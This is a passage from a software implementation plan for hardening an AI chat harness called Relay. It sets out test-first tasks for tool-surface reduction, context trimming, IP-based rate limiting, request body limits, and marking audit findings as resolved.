- **Do:** Write failing-first specs: unknown slug fails before any card, `list_api_catalog` slugs all import, paged list, double import refused, forced failure leaves no collection, generic id `validate` with no "Delete 0" card (HH-M00, HH-M09, L-06); no overlapping tool pair, `parentId` accepted everywhere, folder id rejected with a coded error naming the folder tool, old `delete_request` thread renders (HH-M18); `list_history` (HH-M15); `load_tools` enables a group, unknown topic rejected, `load_tools_first` error, no tool disappears with a pending result (HH-M03).
- **Acceptance:** Covers HH-M00, HH-M03, HH-M09, HH-M15 (`list_history`), HH-M18, L-06. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/tools/catalogTools.spec.ts src/lib/relay/tools/folderTools.spec.ts src/lib/relay/tools/history.spec.ts src/lib/relay/capabilities.spec.ts src/lib/relay/tools/loadTools.spec.ts --coverage --coverage.include=src/lib/relay/tools/catalogTools.ts,src/lib/relay/tools/folderTools.ts,src/lib/relay/tools/history.ts,src/lib/relay/capabilities.ts,src/lib/relay/tools/loadTools.ts --coverage.reporter=text`
- **Depends on:** T4.11

### T4.13 ☐ Unit: server tool set, prompt and context trimming
- **Kind:** unit
- **Files:** `src/app/api/relay/chat/route.ts`, `src/lib/relay/slashCommands.ts`, `src/lib/relay/server/systemPrompt.ts`, `src/lib/relay/contextBuilder.ts`, `src/lib/relay/tokenBudget.ts`
- **Do:** Write failing-first specs: route sends only core + slash topic + attachment topics + current-turn `load_tools` topics (HH-M03, L-02 narrowed); measured tool-payload characters for a plain turn <= 20,000 (from 48,132) (HH-M03); `/run` description string (L-20); prompt lacks "one logical change at a time", scripted 15-request build fits 12 steps with parallel calls counted once, scope list generated from categories and a test fails if one is missing, "export my history" in scope, permission mode in per-request context (HH-M16, HH-M27, L-01); after 8 tool results the earliest are stubs, latest 6 untouched, pending never stubbed, 12-step loop under `context_too_long` (HH-M26).
- **Acceptance:** Covers HH-M03, HH-M16, HH-M26, HH-M27, L-01, L-02 (narrowed), L-20. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/app/api/relay/chat/route.spec.ts src/lib/relay/slashCommands.spec.ts src/lib/relay/server/systemPrompt.spec.ts src/lib/relay/contextBuilder.spec.ts src/lib/relay/tokenBudget.spec.ts --coverage --coverage.include=src/app/api/relay/chat/route.ts,src/lib/relay/slashCommands.ts,src/lib/relay/server/systemPrompt.ts,src/lib/relay/contextBuilder.ts,src/lib/relay/tokenBudget.ts --coverage.reporter=text`
- **Depends on:** T4.12

### T4.14 ☐ Unit: tool consistency matrix
- **Kind:** unit
- **Files:** `src/lib/relay/tools/registry.ts`, `src/lib/relay/capabilities.ts`, `src/components/relay/ToolRow.tsx`
- **Do:** Write the consistency-matrix spec: for every registered tool assert an implementation, a capability category and en/fr/ja labels, with no hard-coded tool count (tools added: `list_api_catalog`, `list_history`, `load_tools`; removed: `delete_request`); every new error code has en/fr/ja entries; old threads with removed tool names (`delete_request`, `proxyUrl` input) render read-only without errors.
- **Acceptance:** Covers HH-M18 (old-thread render), the Phase 4 locale rule and the matrix edge case. The matrix passes for every registered tool with no hard-coded count. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/tools/toolConsistency.spec.ts src/components/relay/ToolRow.spec.tsx --coverage --coverage.include=src/lib/relay/tools/registry.ts,src/lib/relay/capabilities.ts,src/components/relay/ToolRow.tsx --coverage.reporter=text`
- **Depends on:** T4.13

### T4.15 ☐ E2E: tool surface and old threads
- **Kind:** e2e
- **Scenarios:**
  - `@critical` slash command loads only its topic: the captured chat request body has the core set plus that group (HH-M03)
  - `@critical` an old seeded thread with a removed tool name (`delete_request`) renders without errors (HH-M18)
  - `@high` catalog import: `list_api_catalog` then import succeeds, a second import is refused, an unknown slug shows an error and no card (HH-M00, HH-M09)
  - `@high` a model call to a tool outside the enabled set shows the `load_tools_first` result, then `load_tools` unlocks it (HH-M03)
  - `@medium` "export my history" is answered in scope (HH-M27)
- **Spec:** `e2e/qa/relay-harness-hardening/tool-surface.spec.ts`
- **Acceptance:** Every scenario passes 3 of 3 repeats; the request-body assertion reads the real outgoing chat request.
- **Files:** none expected (add the legacy thread to a seed file only if needed).
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/tool-surface.spec.ts --repeat-each=3`
- **Depends on:** T4.14

🔶 **Checkpoint 4**: the consistency matrix passes, the plain-turn payload is <= 20,000 characters, scripted 12-step loops stay under the context cap, old threads render, and `tool-surface.spec.ts` is green.

---

## Phase 5: Server metering and robustness (H08, M25, M28, M29, M30)

**Adds:** Every model route (Relay chat, inline AI actions and dictation) is rate-limited by the trusted platform IP with request and daily caps, oversized or malformed bodies are rejected cheaply, and a Redis outage degrades to a bounded in-memory limit instead of failing or growing without bound.
**Try in UI:** No new UI; use Relay chat and an inline AI action and confirm both still work end to end ; Inspect `src/lib/relay/server/guard.ts` for the single `TRUSTED_IP_HEADER` constant and no `x-forwarded-for` read ; Run the Phase 5 vitest commands below and expect green.

### T5.1 ☐ Counter interface and HH-M28: atomic expiry, recoverable Redis, coded guard errors
- **Kind:** implementation
- **Files:** `src/lib/relay/server/rateLimit.ts`, `src/lib/relay/server/localRedisCounter.ts`, `src/lib/redis.ts` (Upstash client), `src/lib/relay/server/guard.ts`
- **Do:** Add `incrWithExpiry(key, sec)` to the `RateLimitCounter` interface, implemented by the local Redis, Upstash and memory counters as `SET key 1 EX n NX` then `INCR` only if the SET did not apply (A22; no Lua). Reset `clientPromise` on rejection so a later call recovers. Wrap guard calls so `incr`/`expire`/`ttl` errors fall back to the bounded in-memory counter with a log carrying context, or return a relay JSON error code, never an uncaught 500 (A7). No key may remain without a TTL after a failed `expire`.
- **Acceptance:**
  - A rejecting connect then a recovered connect works on the next call (HH-M28).
  - `incr`/`expire`/`ttl` throwing returns a coded error or falls back, never an uncaught 500 (HH-M28).
  - No key is left without a TTL after a failed `expire` (HH-M28).
- **Verify:** `bunx vitest run src/lib/relay/server src/lib/redis.spec.ts`; `bunx biome check src/lib/relay/server/rateLimit.ts src/lib/relay/server/localRedisCounter.ts src/lib/redis.ts src/lib/relay/server/guard.ts`

### T5.2 ☐ HH-M29: bounded in-memory counter
- **Kind:** implementation
- **Files:** `src/lib/relay/server/rateLimit.ts`, `src/lib/relay/constants.ts`
- **Do:** Add `RELAY_MAX_RATE_KEYS = 10000` and `RELAY_MAX_SCOPE_CHARS = 128`. Cap the Map; sweep expired entries on every insert past the cap without a re-read; if still full of live keys evict the oldest-inserted key. Truncate header values used in keys to 128 chars. In production with no shared counter log loudly once per process, keep the bounded fallback (A8).
- **Acceptance:**
  - Inserting 20,000 distinct keys leaves <= 10,000 entries (HH-M29).
  - Expired entries are swept without a re-read; with only live keys the oldest is evicted (HH-M29).
  - A 1 KB header value is truncated to 128 chars in the key (HH-M29).
  - Production without a shared counter logs once per process (HH-M29).
- **Verify:** `bunx vitest run src/lib/relay/server`; `bunx biome check src/lib/relay/server/rateLimit.ts src/lib/relay/constants.ts`
- **Depends on:** T5.1

### T5.3 ☐ HH-H08 (chat guard): trusted IP, `requests` + `turns` meters, Origin rule
- **Kind:** implementation
- **Files:** `src/lib/relay/server/guard.ts`, `src/lib/relay/constants.ts`, `src/app/api/relay/chat/route.ts`, `README.md`, `agent_docs/polish-and-landing/legal-checklist.md`
- **Do:** Add `TRUSTED_IP_HEADER = "x-real-ip"`, `RELAY_REQUEST_RATE_MAX = RELAY_RATE_LIMIT_MAX * RELAY_MAX_STEPS` (360 / 600 s) and `RELAY_DAILY_REQUEST_CAP = RELAY_DAILY_MESSAGE_CAP * RELAY_MAX_STEPS` (3,600 / day). Two IP-scoped meters (A6): `requests` charged weight 1 for every model request before parsing, and `turns` for user-last requests (today's 30 / 600 s and 300 / day). Daily caps always key on IP; `x-relay-user` may add a second scope but never replaces or resets it. `x-forwarded-for` is never read. A missing Origin is accepted only when `Sec-Fetch-Site` is `same-origin`. Remove the server step-count derived from client `step-start` parts or any client turn id; `RELAY_MAX_STEPS` stays a client UX cap. Re-confirm Vercel's `x-real-ip` behaviour against its docs before landing. Document the self-host proxy requirement in `README.md` env notes and update `agent_docs/polish-and-landing/legal-checklist.md` row 7 (which still cites `x-forwarded-for`). A missing header (local dev) uses a single `unknown` bucket, logged once per process.
- **Acceptance:**
  - A rotated `x-relay-user` does not reset the IP daily cap (HH-H08).
  - A spoofed `x-forwarded-for` is ignored; the bucket follows `x-real-ip` (HH-H08).
  - No Origin and no `Sec-Fetch-Site: same-origin` is rejected (HH-H08).
  - An omitted `step-start` and an assistant-last message are each charged to `requests` (HH-H08).
  - The 361st request in a window is refused with `rate_limited` (HH-H08).
  - README and legal-checklist row 7 document `x-real-ip` and the self-host requirement.
- **Verify:** `bunx vitest run src/lib/relay/server src/app/api/relay`; `bunx biome check src/lib/relay/server/guard.ts src/lib/relay/constants.ts src/app/api/relay/chat/route.ts`
- **Depends on:** T5.2

### T5.4 ☐ HH-M30: cheap rejection of oversized and invalid bodies
- **Kind:** implementation
- **Files:** `src/app/api/relay/chat/route.ts`, `src/lib/relay/server/bodyLimit.ts` (new)
- **Do:** Check `Content-Length` first, stream-limit the body to the existing 256 KB cap (cancel a stream that would exceed it, also when there is no `Content-Length`), and charge the `requests` meter before JSON parse, zod and secret scans.
- **Acceptance:**
  - An oversize body is rejected without being fully read (HH-M30).
  - A chunked body with no `Content-Length` is still capped (HH-M30).
  - A burst of invalid bodies is rate-limited (HH-M30).
- **Verify:** `bunx vitest run src/lib/relay/server src/app/api/relay`; `bunx biome check src/app/api/relay/chat/route.ts src/lib/relay/server/bodyLimit.ts`
- **Depends on:** T5.3

### T5.5 ☐ HH-H08 (`/api/ai`): shared guard without the Relay flag
- **Kind:** implementation
- **Files:** `src/app/api/ai/route.ts`, `src/lib/relay/server/guard.ts`, `src/lib/relay/constants.ts`
- **Do:** Give `guard.ts` one parameterised entry used by chat, STT and `/api/ai` (different bucket prefixes and budgets). `/api/ai` runs origin check, its own `ai:`-prefixed IP-scoped rate and daily limits (defaults `RELAY_RATE_LIMIT_MAX` / 600 s and `RELAY_DAILY_MESSAGE_CAP` / day), zod validation, `maxOutputTokens` and the LLM-key check, without the Relay flag check and without Relay's `requests`/`turns` budget. Return the relay error code for a cross-origin Origin, invalid body or limit reached. `useAI.ts` is unaffected (BUG-05 is intended behaviour).
- **Acceptance:**
  - `/api/ai` returns the relay error code for a cross-origin Origin, an invalid body (zod) and its own limit reached (HH-H08).
  - `maxOutputTokens` is passed to the model call (HH-H08).
  - With the Relay flag off, `/api/ai` still succeeds (HH-H08).
  - Exhausting `/api/ai`'s limit does not limit Relay chat, and the reverse holds (HH-H08).
- **Verify:** `bunx vitest run src/lib/relay/server src/app/api/ai`; `bunx biome check src/app/api/ai/route.ts src/lib/relay/server/guard.ts src/lib/relay/constants.ts`
- **Depends on:** T5.4

### T5.6 ☐ HH-M25 and L-25: STT route
- **Kind:** implementation
- **Files:** `src/app/api/relay/stt/route.ts`
- **Do:** Run the shared guard minus the LLM-key check (STT does not use it; A23) and charge the `requests` meter; check `Content-Length` before `formData()` and keep the size check. The upstream `fetch` gets `AbortSignal.timeout(...)` combined with `req.signal`; an abort maps to `unavailable` (L-25).
- **Acceptance:**
  - Oversize and over-rate requests are rejected before buffering (HH-M25).
  - STT works when the LLM key is absent (HH-M25).
  - An upstream timeout or client abort maps to `unavailable` (L-25).
- **Verify:** `bunx vitest run src/app/api/relay src/lib/relay/server`; `bunx biome check src/app/api/relay/stt/route.ts`
- **Depends on:** T5.5

### T5.7 ☐ Unit: counters, limiter and guard
- **Kind:** unit
- **Files:** `src/lib/relay/server/rateLimit.ts`, `src/lib/relay/server/localRedisCounter.ts`, `src/lib/redis.ts`, `src/lib/relay/server/guard.ts`, `src/lib/relay/server/bodyLimit.ts`
- **Do:** Write failing-first specs with a fake counter: rejecting Redis connect then recovery, `incr`/`expire`/`ttl` throwing, no key left without TTL, `incrWithExpiry` for local, Upstash and memory counters (HH-M28); 20,000 keys <= 10,000, sweep without re-read, oldest eviction, 1 KB header truncated, single production log (HH-M29); guard: rotated `x-relay-user`, spoofed `x-forwarded-for` ignored, missing Origin/`Sec-Fetch-Site`, omitted `step-start`, assistant-last, the 361st request `rate_limited`, missing trusted header single bucket logged once, IPv6 (HH-H08); oversize, chunked and invalid-body burst (HH-M30).
- **Acceptance:** Covers HH-H08, HH-M28, HH-M29, HH-M30 at guard level. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/server/rateLimit.spec.ts src/lib/relay/server/localRedisCounter.spec.ts src/lib/redis.spec.ts src/lib/relay/server/guard.spec.ts src/lib/relay/server/bodyLimit.spec.ts --coverage --coverage.include=src/lib/relay/server/rateLimit.ts,src/lib/relay/server/localRedisCounter.ts,src/lib/redis.ts,src/lib/relay/server/guard.ts,src/lib/relay/server/bodyLimit.ts --coverage.reporter=text`
- **Depends on:** T5.6

### T5.8 ☐ Unit: model routes
- **Kind:** unit
- **Files:** `src/app/api/relay/chat/route.ts`, `src/app/api/ai/route.ts`, `src/app/api/relay/stt/route.ts`
- **Do:** Write failing-first route specs: chat returns coded errors for guard failures and meters before parsing (HH-H08, HH-M30); `/api/ai` cross-origin, invalid body, own limit, `maxOutputTokens` passed, works with the Relay flag off, independent from Relay budgets in both directions (HH-H08); STT oversize/over-rate before buffering, works without the LLM key, upstream timeout/abort -> `unavailable` (HH-M25, L-25).
- **Acceptance:** Covers HH-H08, HH-M25, HH-M30, L-25. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/app/api/relay/chat/route.guard.spec.ts src/app/api/ai/route.spec.ts src/app/api/relay/stt/route.spec.ts --coverage --coverage.include=src/app/api/relay/chat/route.ts,src/app/api/ai/route.ts,src/app/api/relay/stt/route.ts --coverage.reporter=text`
- **Depends on:** T5.7

### T5.9 ☐ E2E: Relay and inline AI still work behind the guard
- **Kind:** e2e
- **Scenarios:**
  - `@critical` a Relay chat turn completes end to end through the guard in a normal browser session (HH-H08)
  - `@high` an inline AI action succeeds with the Relay flag off (HH-H08)
  - `@medium` a rate-limited chat request shows the coded rate-limit message in the dock (HH-H08)
- **Spec:** `e2e/qa/relay-harness-hardening/server-guard.spec.ts`
- **Acceptance:** Every scenario passes 3 of 3 repeats; the rate-limit scenario stubs the route response with the real `rate_limited` code.
- **Files:** none expected.
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/server-guard.spec.ts --repeat-each=3`
- **Depends on:** T5.8

🔶 **Checkpoint 5**: every model route shares the guard, the bypasses named in the report are metered or rejected, the Redis failure and memory-growth cases are bounded; Phase 5 vitest and `server-guard.spec.ts` are green.

---

## Phase 6: Final gate, walkthrough and report update

**Adds:** Nothing new for users; confirms the whole hardening epic works together, typechecks and lints clean, and records every finding as resolved in the audit report.
**Try in UI:** Run the combined QA specs below ; In Review mode ask Relay to set a script, press Stop in a multi-step run, and Undo a deleted collection with a chain ; Open `agent_docs/relay-harness-audit/REPORT.md` and confirm each in-scope finding has a "Resolved in relay-harness-hardening" marker.

### T6.1 ☐ Gate: typecheck, lint, targeted suites
- **Kind:** gate
- **Files:** none
- **Do:** Run the single final `bunx tsc --noEmit` and `bunx biome check` on every touched file; run vitest over every touched area; run the targeted e2e list only (no full suite). Fix real failures at the cause; do not weaken tests.
- **Acceptance:**
  - `bunx tsc --noEmit` clean; `bunx biome check` clean on touched files.
  - Every touched vitest spec green, including `changeLog.property.spec.ts` and the tool consistency matrix.
  - Every `e2e/qa/relay-harness-hardening/*.spec.ts` plus the existing relay chat and confirm specs green with `--repeat-each=2`.
  - Skip-mode behaviour unchanged except where the SPEC says otherwise (SPEC section 8.5).
- **Verify:** `bunx tsc --noEmit`; `bunx biome check src/lib/relay src/lib/redis.ts src/lib/hub.ts src/hooks src/stores src/components/relay src/app/api messages/en/relayDock.json messages/fr/relayDock.json messages/ja/relayDock.json`; `bunx vitest run src/lib/relay src/components/relay src/hooks src/stores src/app/api src/lib/redis.spec.ts src/lib/hub.spec.ts src/i18n`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/security.spec.ts --repeat-each=2`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/lifecycle.spec.ts --repeat-each=2`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/undo.spec.ts --repeat-each=2`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/tool-surface.spec.ts --repeat-each=2`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/server-guard.spec.ts --repeat-each=2`
- **Depends on:** T1.13, T2.14, T3.11, T4.15, T5.9

### T6.2 ☐ Walkthrough: SPEC section 8 flows end to end
- **Kind:** walkthrough
- **Files:** `e2e/qa/relay-harness-hardening/walkthrough.spec.ts` (new), `agent_docs/qa/relay-harness-hardening/01-review-script-card.png`, `agent_docs/qa/relay-harness-hardening/02-image-as-link.png`, `agent_docs/qa/relay-harness-hardening/03-keep-undo-dialog.png`, `agent_docs/qa/relay-harness-hardening/04-undo-collection-chain.png` (new proof shots)
- **Do:** Write the combined walkthrough spec, one `test()` per SPEC section 8 flow: the Review approval card for a script (and none in Skip); an image reply shown as a link with no image request; Stop mid-run issues no further requests; Retry creates no duplicates; a thread switch keeps changes in the original thread; Regenerate shows Keep/Undo; Undo restores a deleted collection with its chain; an old thread with a removed tool name renders; Relay and inline AI still work. Capture the four proof screenshots with headless agent-browser seeded via `--init-script e2e/fixtures/qa-seed.init.js`, `AGENT_BROWSER_SESSION=requestly`, ending with `agent-browser close`.
- **Acceptance:** All listed flows pass; the screenshots are captured and reviewed; Skip mode shows no new prompts for the escalating calls.
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/walkthrough.spec.ts --repeat-each=2`; plus T6.1 suite commands as evidence.
- **Depends on:** T6.1

### T6.3 ☐ DoD: REPORT.md "Resolved in relay-harness-hardening" markers and summary
- **Kind:** dod
- **Files:** `agent_docs/relay-harness-audit/REPORT.md`
- **Do:** For every in-scope finding (H-01..H-09 and M-00..M-30 except M-08: 39 findings) add a "Resolved in relay-harness-hardening" column or marker with finding ID, requirement ID (`HH-*`), commit (write `pending` until the user commits, then fill the hash) and the regression test file from the corresponding Unit/E2E task. Mark ride-along Lows resolved (L-01, L-03, L-04, L-05, L-06, L-07, L-09, L-10, L-14, L-15, L-16, L-18, L-20, L-21, L-23, L-24, L-25, L-26); mark L-02 and L-22 "partially resolved" and name the open sub-items (L-02: no assistant-turn signing, server-side narrowing only; L-22: folder pill and `get_workspace_summary` sub-items). Leave L-11, L-13, L-17, L-19, M-08, L-08 and L-12 unmarked. Then produce the "Implementation Summary" with Verification Steps in the format required by CLAUDE.md.
- **Acceptance:**
  - All 39 in-scope findings carry the marker with finding ID, requirement ID, commit and test file (SPEC 8.3).
  - Ride-along Lows are marked resolved; L-02 and L-22 are marked "partially resolved" with open sub-items named (SPEC 8.3).
  - Every named test file exists on disk.
  - All AC items in SPEC section 7 pass; the summary is produced.
- **Verify:** `grep -c "Resolved in relay-harness-hardening" agent_docs/relay-harness-audit/REPORT.md`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/walkthrough.spec.ts --repeat-each=2` green; T6.1 commands green.
- **Depends on:** T6.2

🔶 **Checkpoint 6**: all 39 requirements pass their acceptance criteria, typecheck and lint are clean, targeted suites are green, and REPORT.md carries the resolved markers.
